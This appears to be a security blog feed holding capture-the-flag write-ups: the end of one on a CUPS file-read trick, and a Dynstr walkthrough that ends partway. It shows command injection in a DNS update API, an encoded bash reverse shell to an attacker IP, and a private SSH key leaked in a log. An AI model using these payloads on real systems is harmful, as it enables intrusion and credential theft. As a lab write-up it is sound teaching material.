<p>The description of the metasploit module for the file read vulnerability on CUPS 1.6.1 states that:</p>
<blockquote>
<p>This module exploits a vulnerability in CUPS &lt; 1.6.2, an open source printing system. CUPS allows members of the <strong>lpadmin group</strong> to make changes to the cupsd.conf configuration. When the user visits the Error Log page in the web interface, the cupsd daemon (running with setuid root) reads the Error Log path and echoes it as plaintext.  &hellip;[SNIP]&hellip;</p>
</blockquote>
<p>Now since I&rsquo;ve a shell session as <strong>lpadmin</strong>, I can try to exploit the file read vulnerability manually.</p>
<p>Not sure if it was exposed by other players with <code>socat</code> to external, but the CUPS web interface is originally listening on localhost 631.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">lp@antique:/home/lp$ netstat -tlpn
</span></span><span class="line"><span class="cl"><span class="o">(</span>Not all processes could be identified, non-owned process info
</span></span><span class="line"><span class="cl"> will not be shown, you would have to be root to see it all.<span class="o">)</span>
</span></span><span class="line"><span class="cl">Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
</span></span><span class="line"><span class="cl">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   
</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:23              0.0.0.0:*               LISTEN      828/python3         
</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:9090            0.0.0.0:*               LISTEN      19247/socat         
</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:9797            0.0.0.0:*               LISTEN      21137/socat         
</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> ::1:631                 :::*                    LISTEN      -                   
</span></span><span class="line"><span class="cl">lp@antique:/home/lp$ ps aux <span class="p">|</span> grep socat
</span></span><span class="line"><span class="cl">lp         <span class="m">19247</span>  0.0  0.0   <span class="m">9028</span>  <span class="m">3484</span> pts/1    S+   17:35   0:00 socat tcp-listen:9090,fork TCP:127.0.0.1:631
</span></span><span class="line"><span class="cl">lp         <span class="m">21137</span>  0.0  0.0   <span class="m">9028</span>  <span class="m">3368</span> ?        S    18:38   0:00 socat tcp-listen:9797,fork tcp:127.0.0.1:631
</span></span><span class="line"><span class="cl">lp         <span class="m">27338</span>  0.0  0.0   <span class="m">8500</span>   <span class="m">748</span> pts/4    S+   22:32   0:00 grep socat
</span></span></code></pre></div><p><a href="https://www.cups.org/doc/man-cupsctl.html">cupsctl</a> is available on this system. Using that utility, I can change the error log path to the file path that I want to read, which in this case is the root flag, and then send a GET request to <code>localhost:631/admin/log/error_log</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">lp@antique:/home/lp$ cupsctl <span class="nv">ErrorLog</span><span class="o">=</span><span class="s2">&#34;/root/root.txt&#34;</span>
</span></span><span class="line"><span class="cl">lp@antique:/home/lp$ curl -s localhost:631/admin/log/error_log
</span></span><span class="line"><span class="cl">5d6d4...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Dynstr</title>
      <link>https://fahmifj.github.io/hackthebox/dynstr/</link>
      <pubDate>Mon, 18 Oct 2021 03:04:29 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/dynstr/</guid>
      <description>Dynstr imitates a company that offers a Dynamic DNS service. The provided API for this service is vulnerable to command injection, allowing me to gain initial access to the system. Enumerating inside the system reveals log files that leak the user SSH key that can only be used after manipulating the DNS records. For the root part, there is a custom script that is vulnerable to wildcard injection. Since the script can be run as root with sudo, it is possible to gain root access from it.</description>
      <content:encoded><![CDATA[<p>Dynstr imitates a company that offers a Dynamic DNS service. The provided API for this service is vulnerable to command injection, allowing me to gain initial access to the system. Enumerating inside the system reveals log files that leak the user SSH key that can only be used after manipulating the DNS records. For the root part, there is a custom script that is vulnerable to wildcard injection. Since the script can be run as root with sudo, it is possible to gain root access from it.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Command injection</li>
<li>Dynamic DNS</li>
<li>Wildcard injection</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Burp Suite</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan with <code>nmap</code> discovers 3 open ports: SSH on 22, BIND 9 DNS on 53, and an Apache web server on 80.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53» 
</span></span><span class="line"><span class="cl">$ nmap -p- --min-rate <span class="m">1000</span> --reason -oA nmap/10-tcp-allport-dynstr 10.10.10.244
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-16 21:06 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.244
</span></span><span class="line"><span class="cl">Host is up, received echo-reply ttl <span class="m">63</span> <span class="o">(</span>0.078s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65532</span> closed ports
</span></span><span class="line"><span class="cl">Reason: <span class="m">65532</span> resets
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE REASON
</span></span><span class="line"><span class="cl">22/tcp open  ssh     syn-ack ttl <span class="m">63</span>
</span></span><span class="line"><span class="cl">53/tcp open  domain  syn-ack ttl <span class="m">63</span>
</span></span><span class="line"><span class="cl">80/tcp open  http    syn-ack ttl <span class="m">63</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 41.14 seconds
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53» 
</span></span><span class="line"><span class="cl">$ nmap -p22,53,80 -sC -sV -oA nmap/10-tcp-allport-scripts-dynstr 10.10.10.244
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-16 21:07 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.244
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.54s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl">53/tcp open  domain  ISC BIND 9.16.1 <span class="o">(</span>Ubuntu Linux<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> dns-nsid: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  bind.version: 9.16.1-Ubuntu
</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Dyna DNS
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 20.76 seconds
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>On port 80, there is a company website named <strong>DYNA DNS</strong>.</p>
<p><div class="img-container"><img src="imgs/image-20210617082250725.png" alt="image-20210617082250725"  /></div>
</p>
<p>This company offers a <a href="https://www.youtube.com/watch?v=rOLGvZagdC0">dynamic DNS</a> service and states that the service is still in beta. There is also shared credentials to use this service.</p>
<p><div class="img-container"><img src="imgs/image-20210617082428463.png" alt="image-20210617082428463"  /></div>
</p>
<p>At the bottom of the page, it reveals another domain name: <code>dyna.htb</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210617082655557.png" alt="image-20210617082655557"  /></div>
</p>
<p>I will update my <code>/etc/hosts</code> with all the discovered domain names :</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.244 dyna.htb dnsalias.htb dynamicdns.htb no-ip.htb&#39;</span> 
</span></span></code></pre></div><p>These domain points to the same site.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53» 
</span></span><span class="line"><span class="cl">$ curl -s http://10.10.10.244/ <span class="p">|</span> wc -c
</span></span><span class="line"><span class="cl"><span class="m">10909</span>
</span></span><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53» 
</span></span><span class="line"><span class="cl">$ <span class="k">for</span> i in dyna.htb dnsalias.htb dynamicdns.htb no-ip.htb<span class="p">;</span> <span class="k">do</span> curl -s http://<span class="nv">$i</span>/ <span class="p">|</span> wc -c<span class="p">;</span> <span class="k">done</span> 
</span></span><span class="line"><span class="cl"><span class="m">10909</span>
</span></span><span class="line"><span class="cl"><span class="m">10909</span>
</span></span><span class="line"><span class="cl"><span class="m">10909</span>
</span></span><span class="line"><span class="cl"><span class="m">10909</span>
</span></span></code></pre></div><h3 id="dns-api">DNS API</h3>
<p>As previously stated in the website, it seems to use the dynamic DNS service, I can refer to <a href="https://www.noip.com/integrate/request">no-ip.com</a>:</p>
<p><div class="img-container"><img src="imgs/image-20210617090837052.png" alt="image-20210617090837052"  /></div>
</p>
<p>To use the service, I will send a request and supply the shared credentials (<code>'dynadns:sndanyd'</code>) in the Authorization header:</p>
<p><div class="img-container"><img src="imgs/image-20210617091044264.png" alt="image-20210617091044264"  /></div>
</p>
<p>It returned with <code>good</code>.</p>
<p>With <code>dig</code>, I can confirm that my domain name has been added to the DNS entry.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53»
</span></span><span class="line"><span class="cl">$ dig @10.10.10.244 iamf.no-ip.htb
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;</span> &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+b1-Debian &lt;&lt;&gt;&gt; @10.10.10.244 iamf.no-ip.htb
</span></span><span class="line"><span class="cl"><span class="p">;</span> <span class="o">(</span><span class="m">1</span> server found<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> global options: +cmd
</span></span><span class="line"><span class="cl"><span class="p">;;</span> Got answer:
</span></span><span class="line"><span class="cl"><span class="p">;;</span> -&gt;&gt;HEADER<span class="s">&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: <span class="m">38459</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> flags: qr aa rd<span class="p">;</span> QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: <span class="m">1</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> WARNING: recursion requested but not available
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> OPT PSEUDOSECTION:
</span></span><span class="line"><span class="cl"><span class="p">;</span> EDNS: version: 0, flags:<span class="p">;</span> udp: <span class="m">4096</span>
</span></span><span class="line"><span class="cl"><span class="p">;</span> COOKIE: a795fc705ec31c660100000060cab226fe335467b6b169e8 <span class="o">(</span>good<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> QUESTION SECTION:
</span></span><span class="line"><span class="cl"><span class="p">;</span>iamf.no-ip.htb.                        IN      A
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> ANSWER SECTION:
</span></span><span class="line"><span class="cl">iamf.no-ip.htb.         <span class="m">30</span>      IN      A       10.10.14.53
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> Query time: <span class="m">864</span> msec
</span></span><span class="line"><span class="cl"><span class="p">;;</span> SERVER: 10.10.10.244#53<span class="o">(</span>10.10.10.244<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> WHEN: Wed Jun <span class="m">16</span> 22:23:34 EDT <span class="m">2021</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> MSG SIZE  rcvd: <span class="m">87</span>
</span></span></code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="identify-command-injection">Identify Command Injection</h4>
<p>On Linux, there is a dynamic DNS utility called <a href="https://linux.die.net/man/8/nsupdate"><code>nsupdate</code></a>. If the backend uses this utility with no sanitization on the input, it is possible to do a command injection.</p>
<p>For the first attempt, I try to submit a semicolon, and it fails the update process.</p>
<p><div class="img-container"><img src="imgs/image-20210617091628552.png" alt="image-20210617091628552"  /></div>
</p>
<p>If I search for that error on Google, I will see <a href="https://stackoverflow.com/questions/46604333/nsupdate-fail-when-called-in-php-with-exec-function">this post</a> from StackOverflow, which shows how <code>nsupdate</code> is executed from PHP using the built-in <code>exec()</code> function.</p>
<p><div class="img-container"><img src="imgs/image-20211018060424803.png" alt="image-20211018060424803"  /></div>
</p>
<p>By assuming that my input falls in <code>update add $MYINPUT.no-ip.htb ...</code>, I try to submit  <strong>`echo+iamf1`</strong>.<div class="img-container"><img src="imgs/image-20210617093614041.png" alt="image-20210617093614041"  /></div>
</p>
<p>It again responded with &ldquo;good&rdquo;.</p>
<p>Checking with <code>dig</code> shows that my domain <code>iamf1.no-ip.htb</code> has been added to the DNS entry. This means the API is vulnerable to command injection.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53»
</span></span><span class="line"><span class="cl">$ dig @10.10.10.244 iamf1.no-ip.htb
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;</span> &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+b1-Debian &lt;&lt;&gt;&gt; @10.10.10.244 iamf1.no-ip.htb
</span></span><span class="line"><span class="cl"><span class="p">;</span> <span class="o">(</span><span class="m">1</span> server found<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> global options: +cmd
</span></span><span class="line"><span class="cl"><span class="p">;;</span> Got answer:
</span></span><span class="line"><span class="cl"><span class="p">;;</span> -&gt;&gt;HEADER<span class="s">&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: <span class="m">65360</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> flags: qr aa rd<span class="p">;</span> QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: <span class="m">1</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> WARNING: recursion requested but not available
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> OPT PSEUDOSECTION:
</span></span><span class="line"><span class="cl"><span class="p">;</span> EDNS: version: 0, flags:<span class="p">;</span> udp: <span class="m">4096</span>
</span></span><span class="line"><span class="cl"><span class="p">;</span> COOKIE: 8164817dd17125330100000060cab5248a60afa8ae9615d7 <span class="o">(</span>good<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> QUESTION SECTION:
</span></span><span class="line"><span class="cl"><span class="p">;</span>iamf1.no-ip.htb.               IN      A
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> ANSWER SECTION:
</span></span><span class="line"><span class="cl">iamf1.no-ip.htb.        <span class="m">30</span>      IN      A       10.10.14.53
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> Query time: <span class="m">735</span> msec
</span></span><span class="line"><span class="cl"><span class="p">;;</span> SERVER: 10.10.10.244#53<span class="o">(</span>10.10.10.244<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> WHEN: Wed Jun <span class="m">16</span> 22:36:20 EDT <span class="m">2021</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> MSG SIZE  rcvd: <span class="m">88</span>
</span></span></code></pre></div><p>I also assume that the update command is enclosed with <code>EOF</code>, and when I put <code>&quot;</code> to enclose it, the server response leaks how it updates the DNS entry.</p>
<p><div class="img-container"><img src="imgs/image-20210617101554395.png" alt="image-20210617101554395"  /></div>
</p>
<h4 id="reverse-shell">Reverse Shell</h4>
<p>To avoid bad characters, I will encode the reverse shell payload with double base64.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s2">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.53/9000 0&gt;&amp;1&#39;&#34;</span> <span class="p">|</span>base64 <span class="p">|</span>base64 -w0
</span></span><span class="line"><span class="cl"><span class="nv">WW1GemFDQXRZeUFuWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0MU15ODVNREF3SURBK0pqRW5DZz09Cg</span><span class="o">==</span>
</span></span></code></pre></div><p>The final query will looks like this.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">/nic/update?hostname=&#34;`echo+WW1GemFDQXRZeUFuWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0MU15ODVNREF3SURBK0pqRW5DZz09Cg==+|base64+-d|base64+-d|bash`+iamf.no-ip.htb&amp;myip=10.10.14.53
</span></span></code></pre></div><p>On my listener</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53»
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">9000</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.53<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.244<span class="o">]</span> <span class="m">49648</span>
</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>659<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">www-data@dynstr:/var/www/html/nic$ id
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span></span></code></pre></div><p>I will upgrade my shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@dynstr:/var/www/html/nic$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl">www-data@dynstr:/var/www/html/nic$ which python3
</span></span><span class="line"><span class="cl">which python3
</span></span><span class="line"><span class="cl">/usr/bin/python3
</span></span><span class="line"><span class="cl">www-data@dynstr:/var/www/html/nic$ python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;ython3 -c &#39;</span>import pty<span class="p">;</span>pty.spawn<span class="o">(</span><span class="s2">&#34;/bin/bash&#34;</span><span class="o">)</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl">www-data@dynstr:/var/www/html/nic$ ^Z
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">7584</span> suspended  nc -nvlp <span class="m">9000</span>
</span></span><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53»
</span></span><span class="line"><span class="cl">$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">7584</span> continued  nc -nvlp <span class="m">9000</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">www-data@dynstr:/var/www/html/nic$ 
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-bindmgr">Shell as bindmgr</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>Under <code>/home/bindmgr/support-case-C62796521</code>, there are several files that are readable by others.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@dynstr:/home/bindmgr/support-case-C62796521$ ls -l
</span></span><span class="line"><span class="cl">total <span class="m">428</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> bindmgr bindmgr <span class="m">237141</span> Mar <span class="m">13</span> 14:53 C62796521-debugging.script
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> bindmgr bindmgr  <span class="m">29312</span> Mar <span class="m">13</span> 14:53 C62796521-debugging.timing
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> bindmgr bindmgr   <span class="m">1175</span> Mar <span class="m">13</span> 14:53 command-output-C62796521.txt
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> bindmgr bindmgr <span class="m">163048</span> Mar <span class="m">13</span> 14:52 strace-C62796521.txt
</span></span></code></pre></div><p>The <code>strace-C62796521.txt</code> file contains a SSH private key.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@dynstr:/home/bindmgr/support-case-C62796521$ cat strace-C62796521.txt
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl"><span class="m">15123</span> openat<span class="o">(</span>AT_FDCWD, <span class="s2">&#34;/home/bindmgr/.ssh/id_rsa&#34;</span>, O_RDONLY<span class="o">)</span> <span class="o">=</span> <span class="m">5</span>
</span></span><span class="line"><span class="cl"><span class="m">15123</span> fstat<span class="o">(</span>5, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFREG<span class="p">|</span>0600, <span class="nv">st_size</span><span class="o">=</span>1823, ...<span class="o">})</span> <span class="o">=</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="m">15123</span> read<span class="o">(</span>5, <span class="s2">&#34;-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\nUOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX\nCUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz\nuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a\nXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P\nZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk\n+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs\n4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq\nxTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD\nPswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k\nobFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l\nu291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS\nTbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A\nTyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE\nBNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv\nC79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX\nWv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt\nU96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ\nb6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5\nrlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG\njGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\n-----END OPENSSH PRIVATE KEY-----\n&#34;</span>, 4096<span class="o">)</span> <span class="o">=</span> <span class="m">1823</span>
</span></span></code></pre></div><p>But when I try to use that key for SSH login, it asks for a password.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «ssh-keys» «10.10.14.53»
</span></span><span class="line"><span class="cl">$ ssh -i bindmgr_rsa bindmgr@10.10.10.244
</span></span><span class="line"><span class="cl">bindmgr@10.10.10.244<span class="err">&#39;</span>s password:
</span></span></code></pre></div><p>My first guess is SSH has been configured to password only, but I find that <a href="https://unix.stackexchange.com/questions/56941/what-is-the-point-of-sshd-usedns-option">UseDNS</a> is enabled here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@dynstr:/home$ cat /etc/ssh/sshd_config <span class="p">|</span> grep -v <span class="s1">&#39;^#&#39;</span> <span class="p">|</span> awk <span class="s1">&#39;NF&#39;</span>
</span></span><span class="line"><span class="cl">Include /etc/ssh/sshd_config.d/*.conf
</span></span><span class="line"><span class="cl">PermitRootLogin yes
</span></span><span class="line"><span class="cl">ChallengeResponseAuthentication no
</span></span><span class="line"><span class="cl">UsePAM yes
</span></span><span class="line"><span class="cl">X11Forwarding yes
</span></span><span class="line"><span class="cl">PrintMotd no
</span></span><span class="line"><span class="cl">UseDNS yes
</span></span><span class="line"><span class="cl">AcceptEnv LANG LC_*
</span></span><span class="line"><span class="cl">Subsystem       sftp    /usr/lib/openssh/sftp-server
</span></span></code></pre></div><p>Then if I look at the authorized keys, it seems SSH login only possible from a specific domain that starts with <code>*.infra.dyna.htb</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@dynstr:/home/bindmgr$ ls -l .ssh/
</span></span><span class="line"><span class="cl">ls -l
</span></span><span class="line"><span class="cl">total <span class="m">16</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> bindmgr bindmgr  <span class="m">419</span> Mar <span class="m">13</span> 14:53 authorized_keys
</span></span><span class="line"><span class="cl">-rw------- <span class="m">1</span> bindmgr bindmgr <span class="m">1823</span> Mar <span class="m">13</span> 14:53 id_rsa
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> bindmgr bindmgr  <span class="m">395</span> Mar <span class="m">13</span> 14:53 id_rsa.pub
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> bindmgr bindmgr  <span class="m">444</span> Mar <span class="m">13</span> 14:53 known_hosts
</span></span><span class="line"><span class="cl">www-data@dynstr:/home/bindmgr$ cat .ssh/authorized_keys
